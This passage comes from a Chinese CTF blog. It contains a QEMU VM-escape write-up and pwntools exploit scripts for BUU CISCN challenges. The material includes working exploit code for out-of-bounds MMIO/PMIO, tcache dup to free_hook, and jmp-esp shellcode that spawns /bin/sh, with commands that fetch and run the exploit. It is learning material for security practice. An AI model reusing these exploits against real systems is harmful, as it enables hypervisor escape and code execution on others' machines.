PROT_WRITE, MAP_SHARED, mmio_fd, 0);</span><br><span class="line">if (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(&quot;mmap mmio_mem failed&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;mmio_mem @ %p\n&quot;, mmio_mem);</span><br></pre></td></tr></table></div></figure>

<p>(3)对mmio空间进行写操作，调用strng_mmio_write函数，将”cat /root/flag”写入到regs[2]中：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">mmio_write(8,0x20746163);</span><br><span class="line">mmio_write(12,0x6f6f722f);</span><br><span class="line">mmio_write(16,0x6c662f74);</span><br><span class="line">mmio_write(20,0x6761);</span><br></pre></td></tr></table></div></figure>

<p>这里由于需要满足传入的addr右移两位后形成的idx需要&gt;=2，所以从8依次开始。</p>
<p>(4)编写pmio空间越界读和越界写的函数：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint32_t pmio_arbread(uint32_t offset)</span><br><span class="line">&#123;</span><br><span class="line">    pmio_write(pmio_base+0,offset);</span><br><span class="line">    return pmio_read(pmio_base+4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pmio_abwrite(uint32_t offset, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    pmio_write(pmio_base+0,offset);</span><br><span class="line">    pmio_write(pmio_base+4,value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>(5)利用pmio空间越界读取漏洞，泄露libc地址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">if (iopl(3) !=0 )</span><br><span class="line">    die(&quot;I/O permission is not enough&quot;);</span><br><span class="line"></span><br><span class="line">// leaking libc address</span><br><span class="line">uint64_t srandom_addr=pmio_arbread(0x108);</span><br><span class="line">srandom_addr=srandom_addr&lt;&lt;32;</span><br><span class="line">srandom_addr+=pmio_arbread(0x104);</span><br><span class="line">//这里的都是为了设置idx从而读取用的</span><br><span class="line"></span><br><span class="line">printf(&quot;leaking srandom addr: 0x%llx\n&quot;,srandom_addr);</span><br><span class="line">uint64_t libc_base= srandom_addr-0x43bb0;</span><br><span class="line">uint64_t system_addr= libc_base+0x4f440;</span><br><span class="line">printf(&quot;libc base: 0x%llx\n&quot;,libc_base);</span><br><span class="line">printf(&quot;system addr: 0x%llx\n&quot;,system_addr);</span><br><span class="line">//不同的主机环境的libc版本不同，需要修改</span><br></pre></td></tr></table></div></figure>

<p>(6)利用越界写，将rand_r函数改写成system函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// overwrite rand_r pointer to system</span><br><span class="line">pmio_abwrite(0x114,system_addr&amp;0xffffffff);</span><br><span class="line"></span><br><span class="line">mmio_write(0xc,0);//补0</span><br></pre></td></tr></table></div></figure>

<p>最后编译：gcc -m32 -O0 -static -o exp exp.c，然后传到虚拟机里面，可以用下列两种方法：</p>
<p>①scp -P5555 exp <span class="exturl"><a class="exturl__link"   href="mailto:&#117;&#x62;&#117;&#110;&#x74;&#117;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;" >&#117;&#x62;&#117;&#110;&#x74;&#117;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:/home/ubuntu，由于开了端口，所以可以直接通过scp端口传输。</p>
<p>②使用python库简易搭建一个ftp传输：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#主机中运行</span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line">#qemu中运行，其中ip地址需要改变一下，对于主机ip</span><br><span class="line">wget -O ./exp http://192.168.80.132:8000/exp</span><br></pre></td></tr></table></div></figure>

<p>最后可以看到成功运行：这里我修改了cat /root/flag命令，变成/bin/sh，可以看到返回了一个主机里面的终端sh，成功实现逃逸。但是这个终端sh输入命令不显示，回显消息比较慢，但是个确确实实的主机终端，如果有条件的话，应该是可以实现多重逃逸的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg" alt="img"></p>
<p>▲qemu逃逸调试：</p>
<p>1.将exp传进qemu之后，在主机上使用命令ps aux|grep qemu，找到qemu的任务id，然后gdb attach qemu_id。</p>
<p>2.下断点在需要的函数：b *strng_mmio_write，然后输入c接着运行。</p>
<p>3.在qemu中sudo ./exp，现在就能在主机的gdb中停下来，就可以调试了。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">p *strng</span><br><span class="line">p strng.regs[1]</span><br><span class="line">p strng.srand</span><br></pre></td></tr></table></div></figure>

<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/search?keyword=qemu" >https://xz.aliyun.com/search?keyword=qemu</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/CISCN-BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/">CISCN-BUU刷题记录2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.ciscn_2019_es_1：UAF，tcache dup，比较常规，泄露地址，打free_hook。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_es_1&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;27956&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choice:&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, con, call</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;compary&#x27;s name\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;name:\n&quot;</span>, con)</span><br><span class="line">    sla(<span class="string">&quot;compary call:\n&quot;</span>, <span class="built_in">str</span>(call))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#main_arena_off = 0x3ebc40</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&quot;A&quot;</span>,<span class="number">123</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;B&quot;</span>,<span class="number">123</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x08</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">123</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>,malloc_hook)</span><br><span class="line">libc_base = malloc_hook - obj.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">free_hook = libc_base + obj.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(free_hook),<span class="number">123</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x18</span>,p64(system_addr),<span class="number">123</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>,p64(system_addr),<span class="number">123</span>) <span class="comment">#5</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>2.ciscn_s_9：这题有点意思，栈溢出长度比较短，但是还是够用来泄露地址然后ret2libc。除此之外题目中给了一个hint，可以直接借用jump esp这个gadget来手写shellcode，拉动esp上移到我们输入位置，这样就不再需要考虑到劫持ebp上挪之后的函数剩下的汇编代码。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_s_9&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;26029&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh has been in ELF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sh_addr = 0x080482EA</span></span><br><span class="line"><span class="string">payload = &quot;&quot;</span></span><br><span class="line"><span class="string">payload += &quot;A&quot;*(0x48+0x4)</span></span><br><span class="line"><span class="string">payload += p32(system_plt)</span></span><br><span class="line"><span class="string">payload += p32(0x11111111) #paddding(system_plt ret addr)</span></span><br><span class="line"><span class="string">payload += p32(sh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh not in ELF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload = &quot;&quot;</span></span><br><span class="line"><span class="string">payload += &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload += p32(read_plt)</span></span><br><span class="line"><span class="string">payload += p32(system_plt)</span></span><br><span class="line"><span class="string">payload += p32(0x1) #fd</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr) #parameter</span></span><br><span class="line"><span class="string">payload += p32(0x4) #n</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak addr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload1 = &quot;&quot;</span></span><br><span class="line"><span class="string">payload1 += &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload1 += p32(puts_plt)</span></span><br><span class="line"><span class="string">payload1 += p32(main_addr)</span></span><br><span class="line"><span class="string">payload1 += p32(puts_got)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload2 = &quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;A&quot;*0x10</span></span><br><span class="line"><span class="string">payload2 += p32(system_plt)</span></span><br><span class="line"><span class="string">payload2 += p32(0x11111111) #paddding(system_plt ret addr)</span></span><br><span class="line"><span class="string">payload2 += p32(binsh_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">jump_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">shellcode= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">0x24</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">payload += p32(jump_esp)</span><br><span class="line">payload += asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(payload)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>3.ciscn_final_2：这题真是最有意思了，调了我快一天。</p>
<p>(1)bool公用，dup free之前必须先申请。</p>
<p>(2)int_pt和short_int_pt全局。</p>
<p>(3)开了seccomp保护，但是最开始加载了flag，句柄fd设置为666。</p>
<p>▲漏洞在没有清空指令，可以UAF和tcache dup。先常规思考一下思路，UAF和tcache dup泄露堆地址，之后构造chunk进入unsortedbin中，泄露libc地址，然后利用堆块上残留的libc地址部分写覆盖_IO_2_2_stdin_结构体中的fileno为666，这样在choice&gt;4就可以利用scanf来直接读取句柄fd中的内容，也就是flag，顺带打印出来。</p>
<p>其它不说，需要注意的也就是一个printf的格式化输出，泄露堆地址的时候用int接收，然后判断一下是否小于0，小于0则加上0x100000000即可。</p>
<p>主要说libc地址泄露和利用。这里利用部分堆地址进行一定堆布局，修改int_chunk的size为0x4b1，这里我弄大了，只要超过tcache最大限制即可。(然后我看网上常规思路都是填满大于fastbin的tcache，但是我嫌比较麻烦，就用了自己的方法，事实证明大佬的方法其实更有效，比较不容易出错)然后就比较坑爹了。</p>
<p>①由于只有部分libc地址，所以两个选择，一是爆破，0x7fxx——–，需要大概爆破一个字节，0xff次。二是利用chunk上残留的地址，结合tcache up和UAF直接改后面四个字节，直接申请到我们想要地方。这里用第二种方法</p>
